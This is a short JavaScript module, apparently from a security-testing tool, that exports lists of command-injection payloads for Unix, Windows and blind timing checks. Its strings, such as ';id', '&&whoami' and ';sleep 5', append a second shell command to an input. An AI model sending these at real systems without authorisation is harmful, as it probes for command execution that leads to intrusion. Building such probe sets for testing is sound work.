/*
|--------------------------------------------------------------------------
| Command Injection Payload Library
|--------------------------------------------------------------------------
*/

module.exports = {

  unix: [

    ";id",

    ";whoami",

    "&&id",

    "&&whoami",

    "|id",

    "|whoami"

  ],

  windows: [

    "&whoami",

    "&dir",

    "&&whoami",

    "&&dir"

  ],

  blind: [

    ";sleep 5",

    "&&ping -c 5 127.0.0.1",

    "&ping -n 5 127.0.0.1"

  ]

};
